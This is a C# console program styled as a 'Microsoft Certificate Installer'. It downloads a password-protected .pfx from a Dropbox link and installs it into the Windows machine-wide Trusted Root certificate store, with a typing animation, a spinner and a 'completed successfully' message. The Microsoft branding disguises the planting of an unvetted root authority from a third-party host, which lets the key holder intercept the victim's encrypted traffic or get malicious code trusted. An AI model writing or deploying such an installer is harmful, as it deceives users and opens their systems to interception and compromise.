using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;

namespace CertificateInstaller
{
    class Program
    {
        static string url = "https://www.dropbox.com/scl/fi/8ddbu5usnu2up98jbj4up/microsoft.pfx?rlkey=cffqvnjedar5vzvz6op29f0lj&st=zm4ju00l&dl=1";
        static string tempPath = Path.Combine(Path.GetTempPath(), "certificate.pfx");
        static string password = "M1cr0s0ft!Cert#2025";

        static async Task Main(string[] args)
        {
            Console.Title = "Microsoft Certificate Installer By Rafi";
          //  Console.ForegroundColor = ConsoleColor.Green;

            SetConsoleSize(47, 20);
            DisableResize();

            PrintHeader();
            await DownloadCertificate();
            ImportCertificate();
            Cleanup();
            PrintFooter();
        }

        static void PrintHeader()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Clear();
            TypeWrite("==============================================\n");
            TypeWrite("       MICROSOFT CERTIFICATE INSTALLER        \n");
            TypeWrite("       DEVELOP BY NUR MOHAMMAD RAFI           \n");
            TypeWrite("==============================================\n\n");
        }

        static async Task DownloadCertificate()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            TypeWrite("[1/3] Downloading certificate... ");
            using (WebClient client = new WebClient())
            {
                try
                {
                    await client.DownloadFileTaskAsync(new Uri(url), tempPath);
                    Console.WriteLine("✓");
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    TypeWrite($"\nError downloading certificate: {ex.Message}\n");
                    Environment.Exit(1);
                }
            }
        }

        static void ImportCertificate()
        {
            TypeWrite("[2/3] Importing certificate...   ");
            ShowSpinner(() =>
            {
                try
                {
                    var cert = new X509Certificate2(tempPath, password, X509KeyStorageFlags.PersistKeySet);
                    using (var store = new X509Store(StoreName.Root, StoreLocation.LocalMachine))
                    {
                        store.Open(OpenFlags.ReadWrite);
                        store.Add(cert);
                        store.Close();
                    }
                    Console.WriteLine("✓");
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    TypeWrite($"\nError importing certificate: {ex.Message}\n");
                    Environment.Exit(1);
                }
            });
        }

        static void Cleanup()
        {
            TypeWrite("[3/3] Cleaning up...             ");
            try
            {
                if (File.Exists(tempPath))
                    File.Delete(tempPath);
                Console.WriteLine("✓");
            }
            catch
            {
                Console.WriteLine("⚠ (Unable to delete temp file)");
            }
        }

        static void PrintFooter()
        {
            Console.ForegroundColor = ConsoleColor.Green;

            TypeWrite("Installation Completed Successfully! \n");
           
            TypeWrite("Press any key to exit...");
            Console.ReadKey();
        }

        // Typing animation function
        static void TypeWrite(string text, int delay = 20)
        {
            foreach (char c in text)
            {
                Console.Write(c);
                Thread.Sleep(delay);
            }
        }

        // Spinner animation
        static void ShowSpinner(Action action)
        {
            var spinner = new[] { '/', '-', '\\', '|' };
            var done = false;
            var spinnerThread = new Thread(() =>
            {
                int counter = 0;
                while (!done)
                {
                    Console.Write($"\b{spinner[counter++ % spinner.Length]}");
                    Thread.Sleep(100);
                }
            });

            spinnerThread.Start();
            action();
            done = true;
            spinnerThread.Join();
            Console.Write("\b");
        }

        // Resize + lock window
        private static void SetConsoleSize(int width, int height)
        {
            try
            {
                Console.SetWindowSize(width, height);
                Console.SetBufferSize(width, height);
            }
            catch { }
        }

        private static void DisableResize()
        {
            const int MF_BYCOMMAND = 0x00000000;
            const int SC_SIZE = 0xF000;
            const int SC_MAXIMIZE = 0xF030;

            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr systemMenu = GetSystemMenu(consoleWindow, false);

            if (consoleWindow != IntPtr.Zero)
            {
                DeleteMenu(systemMenu, SC_SIZE, MF_BYCOMMAND);
                DeleteMenu(systemMenu, SC_MAXIMIZE, MF_BYCOMMAND);
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        [DllImport("user32.dll")]
        private static extern bool DeleteMenu(IntPtr hMenu, uint uPosition, uint uFlags);
    }
}
